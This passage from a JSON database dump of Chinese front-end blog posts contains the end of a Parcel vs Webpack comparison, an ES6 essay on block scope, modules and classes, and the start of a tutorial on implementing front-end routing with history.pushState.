class=\"heading\"\u003eParcel让人眼前一亮\u003c/h3\u003e\n\u003cp\u003e在用了很久Webpack后用Parcel的感觉就像用了很久Android机后用iPhone，不用再去操心细节和配置，大多数时候Parcel刚刚够用而且用的很舒服。\u003c/p\u003e\n\u003cp\u003e用Parcel去完成以上项目的要求，我只是专心去写项目页面所必须的代码，Parcel智能快速的帮我构建出了能正常运行的结果。\u003c/p\u003e\n\u003cp\u003e以下是Parcel让我心动的点：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eParcel能做到无配置完成以上项目构建要求；\u003c/li\u003e\n\u003cli\u003eParcel内置了常见场景的构建方案及其依赖，无需再安装各种依赖；\u003c/li\u003e\n\u003cli\u003eParcel能以HTML为入口，自动检测和打包依赖资源；\u003c/li\u003e\n\u003cli\u003eParcel默认支持模块热替换，真正的开箱即用；\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e而反观Webpack，比Parcel要麻烦很多：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e需要写\u003ca target=\"_blank\" href=\"https://github.com/gwuhaolin/parcel-vs-webpack/blob/master/webpack.config.js\"\u003e一堆配置\u003c/a\u003e；\u003c/li\u003e\n\u003cli\u003e需要再安装\u003ca target=\"_blank\" href=\"https://github.com/gwuhaolin/parcel-vs-webpack/blob/master/package.json\"\u003e一堆依赖\u003c/a\u003e；\u003c/li\u003e\n\u003cli\u003e不能简单的自动生成HTML；\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这个项目我用Parcel时花在构建配置上的时间不到一分钟，而用Webpack构建时花了5分钟去配置。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eParcel还需要时间去打磨\u003c/h3\u003e\n\u003cp\u003e通过以上项目实践，发现Parcel目前有如下明显的缺点：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e不支持SourceMap\u003c/strong\u003e：在开发模式下，Parcel也不会输出SourceMap，目前只能去调试可读性极低的代码；\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e不支持剔除无效代码(TreeShaking)\u003c/strong\u003e：很多时候我们只用到了库中的一个函数，结果Parcel把整个库都打包了进来；\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e一些依赖会让Parcel出错\u003c/strong\u003e：当你的项目依赖了一些Npm上的模块时，有些Npm模块会让Parcel运行错误；\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003eParcel需要为零配置付出代价\u003c/h3\u003e\n\u003cp\u003e零配置其实是把各种常见的场景做为默认值来实现的，这虽然能节省很多工作量，快速上手，但这同时会带来一些问题：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e不守规矩的node_module\u003c/strong\u003e：有些依赖的库在发布到Npm上时可能不小心把\u003ccode\u003e.babelrc\u003c/code\u003e \u003ccode\u003epostcss.config.js\u003c/code\u003e \u003ccode\u003etsconfig.json\u003c/code\u003e这些配置文件也一起发布上去了，\n由于目前Parcel只要在目录中发现这些配置文件就会认为该项目中的代码需要被处理。例如mini-store这个库中就把\u003ccode\u003e.babelrc\u003c/code\u003e文件发布到了Npm上，项目依赖的本来是lib中已经编译成了ES5的JS代码了，但Parcel还会去用Babel处理一遍。\nNpm官方并没有规定发布到Npm上的包需要符合哪些规范，这会让Parcel很为难。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e不灵活的配置\u003c/strong\u003e：零配置的Parcel关闭了很多配置项，在一些需要的配置的场景下无法改变。例如：\n\u003cul\u003e\n\u003cli\u003e无法控制对部分文件的特殊处理，以实现诸如按需加载这样的需求；\u003c/li\u003e\n\u003cli\u003e无法控制\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/2%E9%85%8D%E7%BD%AE/2-2Output.html\"\u003e输出文件名的Hash值和名称\u003c/a\u003e；\u003c/li\u003e\n\u003cli\u003e无法控制构建输出目录结构；\u003c/li\u003e\n\u003cli\u003e无法\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/2%E9%85%8D%E7%BD%AE/2-4Resolve.html\"\u003e映射路径以缩短导入语句\u003c/a\u003e；\u003c/li\u003e\n\u003cli\u003eHTTP开发服务器不支持\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/2%E9%85%8D%E7%BD%AE/2-6DevServer.html\"\u003eHistoryApi\u003c/a\u003e；\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003eParcel使用场景受限\u003c/h3\u003e\n\u003cp\u003e目前Parcel\u003cstrong\u003e只能用来构建用于运行在浏览器中的网页\u003c/strong\u003e，这也是他的出发点和专注点。\n在软件行业不可能存在即使用简单又可以适应各种场景的方案，就算所谓的人工智能也许能解决这个问题，但人工智能不能保证100%的正确性。\u003c/p\u003e\n\u003cp\u003e反观Webpack除了用于构建网页，还可以做：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/3%E5%AE%9E%E6%88%98/3-13%E6%9E%84%E5%BB%BANpm%E6%A8%A1%E5%9D%97.html\"\u003e打包发布到Npm上的库\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/3%E5%AE%9E%E6%88%98/3-11%E6%9E%84%E5%BB%BA%E5%90%8C%E6%9E%84%E5%BA%94%E7%94%A8.html\"\u003e构建Node.js应用(同构应用)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/3%E5%AE%9E%E6%88%98/3-12%E6%9E%84%E5%BB%BAElectron%E5%BA%94%E7%94%A8.html\"\u003e构建Electron应用\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/3%E5%AE%9E%E6%88%98/3-14%E6%9E%84%E5%BB%BA%E7%A6%BB%E7%BA%BF%E5%BA%94%E7%94%A8.html\"\u003e构建离线应用(ServiceWorkers)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e构建速度和输出文件大小对比\u003c/h3\u003e\n\u003cp\u003e分别去用Parcel和Webpack构建以上项目，收集的数据如下：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e数据项\u003c/th\u003e\n\u003cth\u003eParcel\u003c/th\u003e\n\u003cth\u003eWebpack\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e生成环境构建时间\u003c/td\u003e\n\u003ctd\u003e8.310s\u003c/td\u003e\n\u003ctd\u003e9.58s\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e开发环境启动时间\u003c/td\u003e\n\u003ctd\u003e5.42s\u003c/td\u003e\n\u003ctd\u003e8.06s\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e监听变化构建时间\u003c/td\u003e\n\u003ctd\u003e3.17s\u003c/td\u003e\n\u003ctd\u003e2.87s\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e生成环境输出JS文件大小\u003c/td\u003e\n\u003ctd\u003e544K\u003c/td\u003e\n\u003ctd\u003e274K\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e生成环境输出CSS文件大小\u003c/td\u003e\n\u003ctd\u003e23K\u003c/td\u003e\n\u003ctd\u003e23K\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e从以上数据可以看出：\u003cstrong\u003eParcel构建速度快，但Parcel输出文件大\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e导致Parcel构建速度快的原因和iOS比Android用起来更流畅的原因类似：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eParcel因为一体化内置，所以集成和优化的更好，而Webpack通过插件和Loader机制去让第三方扩展这会拉低性能；\u003c/li\u003e\n\u003cli\u003eParcel内置多进程并行构建，而Webpack默认是单进程构建（\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-3%E4%BD%BF%E7%94%A8HappyPack.html\"\u003eWebpack也支持多进程\u003c/a\u003e）；\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e导致Parcel输出JS文件大的原因在于：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e不支持TreeShaking\u003c/li\u003e\n\u003cli\u003e构建出的JS中出现了所有文件的名称，如图：\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/27/1609828804675828?w=2206\u0026amp;h=546\u0026amp;f=png\u0026amp;s=307152\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e以上\u003ca target=\"_blank\" href=\"https://github.com/gwuhaolin/parcel-vs-webpack\"\u003e项目完整源码可下载\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e总结\u003c/h3\u003e\n\u003cp\u003e现阶段的Parcel就像beta版的iPhone，看上去很美好但还不能用于生成环境，如果你现在就把Parcel用于生成环境，相信我你一定会踩很多坑。\n踩坑不要紧，要命的是无法在网上找到解决方法以快速解决问题。\u003c/p\u003e\n\u003cp\u003e我不是不鼓励大家使用Parcel，历史总需要先驱去推动，就像乔布斯义无反顾的引领了一个时代，我们也需要去实践Parcel，坑都是一个个填平的，所以我鼓励大家在一些个人小项目中使用Parcel。\u003c/p\u003e\n\u003cp\u003e如果Parcel能解决上面提到的这些问题，我会毫不犹豫的在我的下一个项目中使用他。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://wuhaolin.cn/2017/12/27/Parcel%20Vs%20Webpack/\"\u003e阅读原文\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514893082.0065","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f3e"},"id":"5a41c9e8f265da430406dde3","author":{"$oid":"5a4b76338b69bb25d83da3cb"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"摧枯拉朽，说说ES6的三把火","meta":{"likeCount":0},"tag":["JavaScript","前端","编程语言","Java"],"comment":[],"shortContent":"JavaScript 如今可谓是屌丝逆袭高富帅的代名词哈，从当初闹着玩似的诞生到现在 Github 上力压群雄的人气王，JS 搭着互联网的顺风车一路高歌，本身也从一个爷爷不疼奶奶不爱的杀马特小脚本蜕变为一门高大上的主流编程语言。运气固然重要，ES6 也让大家看到了这门语言自身的…","content":"\u003ch1 class=\"heading\"\u003e我是 Jser 我骄傲\u003c/h1\u003e\n\u003cp\u003eJavaScript 如今可谓是屌丝逆袭高富帅的代名词哈，从当初闹着玩似的诞生到现在 Github 上力压群雄的人气王，JS 搭着互联网的顺风车一路高歌，本身也从一个爷爷不疼奶奶不爱的杀马特小脚本蜕变为一门高大上的主流编程语言。运气固然重要，ES6 也让大家看到了这门语言自身的努力和上进，相信 JavaScript 定大有可为。\u003c/p\u003e\n\u003cp\u003eES6 发布于 2015 年 6 月，因此也叫 ES2015，距今已有两年多。2015 年是铭心刻骨的一年，这一年，股市崩盘，千古跌停，手里的两个票更是挨了腰斩，宝宝心里苦。同是这一年，ES6 标准落地，作为一名前端开发，宝宝心里乐开了花。\u003c/p\u003e\n\u003cp\u003eES6 的新语法很多很碎，如果想系统地学习一遍，强烈推荐阮一峰老师的 \u003ca target=\"_blank\" href=\"http://es6.ruanyifeng.com/\"\u003eECMAScript 6 入门\u003c/a\u003e。本文的目的不是要介绍 ES6 的新语法，而是想谈谈 ES6 为JavaScript 这门语言带来了什么，这也是在咱看来 ES6 最重要最激动人心的特性。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e作用域\u003c/h1\u003e\n\u003cp\u003e作用域一直是程序设计语言的基础设施。JavaScript 也有作用域，但它的作用域有点怪，稍不留神就会掉到坑里。\u003c/p\u003e\n\u003cp\u003eJavaScript 的作用域(scope)有三种类型，分别是 Local，Closure，Global，对应的就是三种作用域变量类型，分别是局部变量，闭包变量和全局变量。\u003c/p\u003e\n\u003cp\u003e比如下面一段代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-string\"\u003e'global'\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eouter\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = \u003cspan class=\"hljs-string\"\u003e'closure'\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003einner\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e c = \u003cspan class=\"hljs-string\"\u003e'local'\u003c/span\u003e\n\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + b + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + c)\n    }\n}\nouter()()\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 Chrome 控制台执行上面代码，在执行 \u003ccode\u003eouter()()\u003c/code\u003e 时，\u003ccode\u003ea\u003c/code\u003e，\u003ccode\u003eouter\u003c/code\u003e 都是全局变量，浏览器环境中的全局变量全部挂在全局 \u003ccode\u003ewindow\u003c/code\u003e 对象上。\u003ccode\u003eb\u003c/code\u003e 是闭包变量， 对 \u003ccode\u003etemp\u003c/code\u003e 函数内定义的函数保持可见。\u003ccode\u003ec\u003c/code\u003e 是局部变量，只对 \u003ccode\u003einner\u003c/code\u003e 函数内部可见。\u003c/p\u003e\n\u003cp\u003e看上去似乎没什么问题，接下来看点有问题的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e){\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e _a = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n}\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(_a)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e正常情况，\u003ccode\u003e_a\u003c/code\u003e 应该是 \u003ccode\u003eundefined\u003c/code\u003e 的才对，然而不要以为你以为就是你以为的。\u003ccode\u003eif\u003c/code\u003e 语句块里定义的变量 \u003ccode\u003e_a\u003c/code\u003e 直接变成了全局变量。如果是从C语言，Java等主流编程语言转过来的就更加迷惑了，这简直就是TMD不科学。\u003c/p\u003e\n\u003cp\u003e诸如 \u003ccode\u003efor\u003c/code\u003e，\u003ccode\u003ewhile\u003c/code\u003e，\u003ccode\u003eswitch\u003c/code\u003e 等可接大括号的代码块都是不能定义局部变量的，定义的通通是全局变量，能够定义局部变量的只有函数这个第一公民。这不科学，不合理，不符合社会主义核心价值观\\抓狂。\u003c/p\u003e\n\u003cp\u003e一声霹雳，ES6 落地，完美地弥补了上面 JavaScript 暴露的缺陷。从此以后你可以以为你以为的就是你以为的了。ES6 为了向后兼容，\u003ccode\u003evar\u003c/code\u003e 还是原来的 \u003ccode\u003evar\u003c/code\u003e 保持不变，在此基础上又新添了一个声明变量的关键字 \u003ccode\u003elet\u003c/code\u003e 和一个声明常量的关键字 \u003ccode\u003econst\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e a = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n}\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a)\n\u003cspan class=\"hljs-comment\"\u003e// Uncaught ReferenceError: a is not defined\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e完善的作用域机制可有效地避免命名污染，提高程序的可靠性，减少隐晦的bug，尤其是开发大型多人协作项目时作用尤为明显。所以最佳实践就是自始至终地使用 \u003ccode\u003elet\u003c/code\u003e，而不要再让 \u003ccode\u003evar\u003c/code\u003e 这个混小子出现在视线里。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e模块系统\u003c/h1\u003e\n\u003cp\u003e模块化，模块化，模块化，重要的事情说三遍，这是工程化的第一要务，是控制软件复杂度的最重要措施，没有之一。然而 2015 年之前的 JavaScript 语言是没有模块系统的。C 有 \u003ccode\u003einclude\u003c/code\u003e，Java 有 \u003ccode\u003eimport\u003c/code\u003e，连 CSS 都有个蹩脚的 \u003ccode\u003e@import\u003c/code\u003e，wrnmmp，JavaScript 却只有 \u003ccode\u003eundefined\u003c/code\u003e。有条件要上，没条件创造条件也要上。于是乎，JavaScript 社区里的各位勇士造出了各种各样实现模块化的轮子，AMD，CMD，UMD 全蹦出来了。不想用又苦于没有好的解决方案，只能在内心呐喊，这不科学，不合理，不符合···\\抓狂。\u003c/p\u003e\n\u003cp\u003e霹雳哗啦，ES6 落地，带来了原生的模块系统，优雅又简单，丝滑般的体验冲淡了腰斩给咱带来的痛，脸上又洋溢出了久违的笑容。\u003c/p\u003e\n\u003cp\u003e最基本的使用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* add.js */\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eadd\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e a + b\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面定义并导出了一个 ES 模块。接下来就可以在任一个逻辑文件里引用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* main.js */\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e {add} \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./add'\u003c/span\u003e\n\nadd(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e模块系统哪家强，ES6 最猖狂。ES6 一出，快刀斩乱麻，直接终结了前端长期的模块化乱象，实现了大一统。唯一的遗憾是 Node.js 对 ES6 模块系统的支持还不是无缝过渡。不过这个还好，毕竟 Node.js 的 CommonJS 用起来还是相当顺手的。\u003c/p\u003e\n\u003cp\u003e有了语言层面的模块系统，JavaScript 也在语言性质上完成了蜕变，不再是一个打遍互联网酱油的小脚本，而成长为一门举重若轻的主流编程语言。模块系统是大型项目不可或缺的标准配置，对项目的开发和维护都非常重要。所以把它列为 ES6 所带来的最重要特性丝毫不为过。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e类(Class)\u003c/h1\u003e\n\u003cp\u003e其实这个特性相比前两个倒是没那么重要，说白了，类(Class)做的就是 JS 原型(prototype)做的那点事——继承，咱觉得这是一个没它也行，有它更好的语法糖功能。之所以把它列在这是因为咱看 prototype 不爽很久了。\u003c/p\u003e\n\u003cp\u003eJS 基于原型的继承机制借鉴自 Self 语言。正如 JS 的设计者所言“它是 C 语言和 Self 语言一夜情的产物”。原型继承是很不直观的，或者可以说是非主流的。面向对象程序设计中典型的继承是基于类的继承，例如 Java，C++ 等主流编程语言实现的均是基于类的继承。\u003c/p\u003e\n\u003cp\u003e使用 prototype 会出现 jQuery 的 \u003ccode\u003ejQuery.prototype.init.prototype = jQuery.prototype\u003c/code\u003e 这种让人瞬间石化的代码。况且咱左看右看，上看下看也没看出来原型继承相较于类式继承有什么优点可言，反而是越看越拙。咱第一眼看到 prototype 这货就很不顺眼，也许是因为从 C++ 开发过来的缘故吧。\u003c/p\u003e\n\u003cp\u003e好在 ES6 带来了 \u003ccode\u003eclass\u003c/code\u003e，不知道大家怎么看，反正咱心里是乐坏了，有一种久别重逢，相见恨晚感觉。\u003c/p\u003e\n\u003cp\u003e来看个最简单示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* Point.js */\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eShape\u003c/span\u003e\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.x = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.y = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e英雄联盟里的盲僧说过“如果类不是为了继承，那将毫无意义”。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e {Point} \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"./Point\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eTriangle\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePoint\u003c/span\u003e\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(){\n        \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e()\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.sides = \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\n    }\n}\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e a = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Triangle()\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这代码看着多直观，多大方，多舒坦。面向对象的概念已经在前端被越来越广泛的传播开来，咱也是非常推崇 \u003ccode\u003eclass\u003c/code\u003e 的继承方式的，不知道喜欢用哪个，反正在咱的代码里已经是看不到 prototype 的影子了。\u003c/p\u003e\n\u003cp\u003e本文属原创文章，转载注明出处，\u003ca target=\"_blank\" href=\"http://www.cnblogs.com/iovec/p/8111677.html\"\u003e点击查看更好的排版\u003c/a\u003e。\u003c/p\u003e\n","buildTime":"1514894383.6917","__v":0}
{"_id":{"$oid":"5a4b76a1b11e1a170cb138e7"},"id":"5a47618ff265da43176a7b6c","author":{"$oid":"5a4b76a1b11e1a170cb138d0"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"怎么理解前端路由? 当然是自己实现一个啦!","meta":{"likeCount":0},"tag":["前端","后端","JavaScript","服务器"],"comment":[],"shortContent":"spa流行的今天不少同学会把前端路由跟后端路由弄混, 莫名其妙的怎么页面404啦之类'奇怪'的问题, 其实这就是没弄清楚前端路由和后端路由的原因(当然你用hash当我没说). 我们可以知道后端其实返回的是html字符串, 也就是dom节点不出意外的话是确认的. 不管你请求多少次…","content":"\u003cp\u003espa流行的今天不少同学会把前端路由跟后端路由弄混, 莫名其妙的怎么页面404啦之类'奇怪'的问题, 其实这就是没弄清楚前端路由和后端路由的原因(当然你用hash当我没说).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e本文所有前端路由都是spa的情况下, 不存在后端渲染好变量的情况\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e原理\u003c/h2\u003e\n\u003cp\u003e首先我们看看前后端路由在浏览器中是怎么工作的, 上图:\u003c/p\u003e\n\u003cp\u003e后端控制的路由:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6d45e22e0e11?w=584\u0026amp;h=157\u0026amp;f=png\u0026amp;s=20018\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我们可以知道后端其实返回的是html字符串, 也就是dom节点不出意外的话是确认的. 不管你请求多少次, 结果都是确定的(get 幂等). 所以也就不存在404的情况\u003c/p\u003e\n\u003cp\u003e前端控制的路由:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6d45e380223f?w=637\u0026amp;h=308\u0026amp;f=png\u0026amp;s=38689\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e如果是spa的话, 我们可以知道不管你请求那个页面, 在后端处理好的情况下后端都会返回一个html文件(所谓单页的由来), 静态资源当然也是类似的. 那么我们可能有点疑问, 比如一个个人主页, 如果只返回一个html文件的话, 怎么得到不同的用户资料呢, 答案就是前端路由(大部分情况, 不排除本地存储😂), js根据不同的路由再向服务器请求相关资料, 也就是说其实第一次服务端渲染我们的页面是空的, 后期ajax请求. 所以我们看到很多单页页面打开了首先要loading一会. 就是在向服务器请求渲染页面.\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实现\u003c/h2\u003e\n\u003cp\u003e后端路由我们暂且不去管它, 我们看看是怎么实现的:\u003c/p\u003e\n\u003cp\u003e在非hash的情况下, 前端路由的实现基础是window.history, 当然我们不用去管它的兼容性了, 反正现在大部分浏览器能用就是了:\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6d45e2b4db31?w=1333\u0026amp;h=167\u0026amp;f=png\u0026amp;s=26864\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehistory\u003c/code\u003e有个重要的方法就是\u003ccode\u003epushState\u003c/code\u003e, 其它的方法暂时用不到不提, 它的作用呢就是改变浏览器地址栏里的地址, 以及在历史纪录里加上一条, 除此以外没啥别的副作用了, 比如:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e stateObj = { \u003cspan class=\"hljs-attr\"\u003efoo\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"bar\"\u003c/span\u003e };\nhistory.pushState(stateObj, \u003cspan class=\"hljs-string\"\u003e\"page 2\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"bar.html\"\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的代码只会跳到一个 \u003ccode\u003ebar.html\u003c/code\u003e的地址, 但是页面本身并未跳转, 我们不是来讲history对象本身的, 有兴趣可以自行翻看mdn.\u003c/p\u003e\n\u003cp\u003e其实参考后端对路由的控制, 我们大略可以想像一个前端路由所具有的功能:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e对路由做出响应\u003c/li\u003e\n\u003cli\u003e渲染\u003c/li\u003e\n\u003cli\u003e一些事件, 比如beforeChange之类的\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e当然我们现在一切从简, 上面那些说清楚了起实现无非就是苦力了, 先给大家看看效果吧:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"2\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6d45e2c3e75a?w=1155\u0026amp;h=744\u0026amp;f=gif\u0026amp;s=95627\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e还是有点意思的吧.\u003c/p\u003e\n\u003cp\u003e下面是html代码:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elang\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan 